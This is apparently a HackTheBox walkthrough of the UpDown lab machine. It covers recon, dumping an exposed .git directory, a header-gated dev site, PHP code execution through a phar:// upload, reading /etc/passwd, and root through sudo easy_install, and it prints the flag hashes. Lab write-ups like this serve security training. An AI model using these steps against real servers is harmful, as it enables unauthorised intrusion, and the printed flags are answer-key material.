![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/31f4dd61-f10a-4b92-87af-4b87a23f6923)### 2024-04-21-Sun

[UpDown | HackTheBox](https://app.hackthebox.com/machines/UpDown)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/6c0b68bd-1f9b-47f6-bf57-f7d70ff824ea)

## About UpDown

UpDown is a medium difficulty Linux machine with SSH and Apache servers exposed. 
On the Apache server a web application is featured that allows users to check if a webpage is up. 
A directory named `.git` is identified on the server and can be downloaded to reveal the source code of the `dev` subdomain running on the target, 
which can only be accessed with a special `HTTP` header. 
Furthermore, the subdomain allows files to be uploaded, leading to remote code execution using the `phar://` PHP wrapper. 
The Pivot consists of injecting code into a `SUID` `Python` script and obtaining a shell as the `developer` user, 
who may run `easy_install` with `Sudo`, without a password. 
This can be leveraged by creating a malicious python script and running `easy_install` on it, as the elevated privileges are not dropped, 
allowing us to maintain access as `root`.

```
nmap -sC -sV -p- --open -Pn 10.129.227.227 -oN nmap.txt
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1f3f36bd-2068-4335-911a-0d0eb617c0f3)

http://10.129.227.227/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ac1722c8-3d03-4d6b-bcbb-558e49f0be72)

http://10.129.227.227/dev/

http://10.129.227.227/dev/.git/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c09f4854-5916-4e20-bc02-ffb0f07e52b7)

```
wget -c http://10.129.227.227/dev/.git/config
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/7ffc80d8-aa30-4fb8-8773-049029dad000)

```
[core]
	repositoryformatversion = 0
	filemode = false
	bare = false
	logallrefupdates = true
	symlinks = false
	ignorecase = true
[remote "origin"]
	url = https://127.0.0.1/siteisup.htb/siteisup
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

http://10.129.227.227/dev/.git/logs/HEAD

```
0000000000000000000000000000000000000000 010dcc30cc1e89344e2bdbd3064f61c772d89a34 root <root@siteisup.(none)> 1634755213 -0400	clone: from https://127.0.0.1/siteisup.htb/siteisup
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9cd2c8b0-2d2b-4112-b8e2-c43cc69c0296)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/cac23f51-0100-4b19-a69a-bfab40cb7e46)

```
echo "10.129.227.227 siteisup.htb" | sudo tee -a /etc/hosts
```

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://siteisup.htb -c -ac -H "HOST: FUZZ.siteisup.htb"
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9270549c-011f-4d4a-a03a-638e5fa59b15)

http://dev.siteisup.htb/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a367e461-57a2-436c-9c1c-9abc0dc3ec60)

https://github.com/arthaud/git-dumper

```
./git_dumper.py http://siteisup.htb/dev/.git dev
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/60988927-356f-401f-b518-c4c417546d08)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/efbb7ec6-5f1c-4866-945f-616f478ce25a)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c3de562b-48f2-4b29-b76c-54462ac7b9cb)

https://youtu.be/zYn4o85crdY
https://www.youtube.com/@noxlumens

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/87b0db09-067f-47d7-8a6e-e11fbe25e283)

```
HTTP/1.1 301 Moved Permanently
Date: Mon, 22 Apr 2024 10:17:56 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://127.0.0.1/dev/.git/
Content-Length: 309
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Mon, 22 Apr 2024 10:17:56 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2881
Content-Type: text/html;charset=UTF-8

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /dev/.git</title>
 </head>
 <body>
<h1>Index of /dev/.git</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/dev/">Parent Directory</a></td><td> </td><td align="right">  - </td><td> </td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="HEAD">HEAD</a></td><td align="right">2021-10-20 19:40  </td><td align="right"> 21 </td><td> </td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="branches/">branches/</a></td><td align="right">2021-10-20 19:40  </td><td align="right">  - </td><td> </td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="config">config</a></td><td align="right">2021-10-20 19:42  </td><td align="right">298 </td><td> </td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="description">description</a></td><td align="right">2021-10-20 19:40  </td><td align="right"> 73 </td><td> </td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="hooks/">hooks/</a></td><td align="right">2021-10-20 19:40  </td><td align="right">  - </td><td> </td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="index">index</a></td><td align="right">2021-10-20 19:42  </td><td align="right">521 </td><td> </td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="info/">info/</a></td><td align="right">2021-10-20 19:40  </td><td align="right">  - </td><td> </td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="logs/">logs/</a></td><td align="right">2021-10-20 19:40  </td><td align="right">  - </td><td> </td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="objects/">objects/</a></td><td align="right">2021-10-20 19:40  </td><td align="right">  - </td><td> </td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="packed-refs">packed-refs</a></td><td align="right">2021-10-20 19:40  </td><td align="right">112 </td><td> </td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="refs/">refs/</a></td><td align="right">2021-10-20 19:40  </td><td align="right">  - </td><td> </td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.41 (Ubuntu) Server at 127.0.0.1 Port 80</address>
</body></html>
```

**.htaccess**

```
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

http://dev.siteisup.htb/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/35b08f82-7a8a-4aee-b3c7-8dbc461b2331)

http://dev.siteisup.htb/?page=admin

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/50f17969-7e40-4f8e-adcd-f98e28b9e7a0)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d111c37a-8239-4848-84b1-ca1a5bd6637d)

```
echo "<?php phpinfo(); ?>" > info.php
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/20e38da3-3fd2-44b5-985a-5b2099a0b106)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/db0739c0-fdeb-4a70-ab7f-9b987345132d)

```
zip rev.zip rev.php
mv rev.zip rev.txt
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/290b5b9a-4f7f-4bb2-ba95-2c8b97f7b980)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/fbf8fde7-78e6-4344-bfd1-69dbfa297cea)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c2efd06c-55d4-46da-b8f6-bea68fef8f20)

http://dev.siteisup.htb/?page=phar://uploads/0c7b9a04adf7c378d59a2975c90826f4/rev.txt/rev

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9566a673-3f72-41f8-9bfb-9f9e0657915b)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a6542c6b-9e23-4800-9f3b-005c999d3349)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/31e10159-3b5f-44eb-80ed-2ba316b045c4)

```
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```

```
cat /etc/passwd | grep -v -e false -e nologin -e sync
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/89f49cef-eeb1-4339-ae79-de67cf1ec5bf)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/25330d11-318c-4d9b-b2c9-2b09215f6400)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b49f7be6-7834-4059-b58c-a4566ae20150)

```
edebe49b03026e348c81e3bc1e962ede
```

```
sudo -l
```

/usr/local/bin/easy_install

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/08977505-ec55-4318-a15e-318dfd4c69c6)

https://gtfobins.github.io/easy_install

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/287258a3-c881-4d44-b32b-75b6528ccd3e)

```
f019569e0d9073f2d1512c89a8c0c7bf
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c673f38d-c623-4114-95ae-c5df34b1b81d)
